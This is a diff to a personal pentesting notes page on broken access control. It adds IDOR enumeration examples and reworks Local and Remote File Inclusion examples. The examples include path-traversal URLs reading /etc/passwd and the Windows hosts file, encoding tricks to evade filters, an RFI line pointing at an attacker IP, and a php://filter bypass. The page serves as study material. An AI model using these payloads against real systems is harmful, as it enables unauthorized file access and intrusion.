@@ -14,18 +14,35 @@ layout:
 
 # Broken Access Control
 
-When a user can see or do things they aren't supposed to. The most common ways in wich it's presented are:
+When a user can see or do things they aren't supposed to. The most common ways in which it's presented are:
 
 * **IDOR:** Insecure Direct Object Reference, when an application fail to secure access to restringed data to an user
 * **Weak authorization:** Fail to protect sensitive content. Example: Secure admin page with a readable cookie
 * **Security through obscurity:** Try to hide secret information in paths that seems  not to be visible.
 * **File Inclusion:** Setting routes via URL to access system files or redirecting to another pages
 
+### Example:
+
+* Check if URL contains enumeration of objects
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+#It is searching for an object with id=2
+http://$url/id/2
+#We can assume that exist id=1 or any number and try to get it
+http://$url/id/$number #This could show objects normally hidden to the user
+```
+{% endcode %}
+
+***
+
 
 
 ## <mark style="color:purple;">Local File Inclusion</mark>
 
 Also known as LFI, able to get a website to include a file that was not intended to be an option for this application
+
+### Example:
 
 * Check if parameters in URL recieve name of a file
 
@@ -34,7 +51,7 @@ Also known as LFI, able to get a website to include a file that was not intended
 #Its searching for a file
 http://$url/$query?$param=hola.php
 #We can try to access to system important files
-www.ddd.com/sss?file=/etc/passwd
+http://$url/$query?$param=/etc/passwd
 ```
 {% endcode %}
 
@@ -49,12 +66,11 @@ http://$url/$query?$param=../../../../../etc/passwd
 
 #Same can be done in windows
 http://$url/$query?$param=../../../../../../WINDOWS/system32/drivers/etc/hosts
-#Common file for save host name and ip in windows
 ```
 {% endcode %}
 
 {% hint style="info" %}
-Use as many ../ as posible to get to root floder
+Is useful to put as many `../` as posible to get to root folder
 {% endhint %}
 
 ***
@@ -83,6 +99,8 @@ http://$url/$query?$param=..\/..\/..\/..\/etc/passwd
 
 Also known as RFI, it is possible for an attacker to redirect actions to or from a another server
 
+### Example:
+
 * Redirect actions of a server via URL parameters
 
 <pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#Its searching for a file
@@ -95,13 +113,13 @@ http://$url/$query?$param=//$myip
 
 ***
 
-* When can use another method or conection
+* When blocking type of protocol
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
 #Code is blocking hhtp
 $file = str_replace( array( "http", "https" ), "", $file );
-#We can use another php conection
+#We can use another conection protocol
 http://$url/$query?$param=php://filter/resource=/etc/passwd
 ```
 {% endcode %}
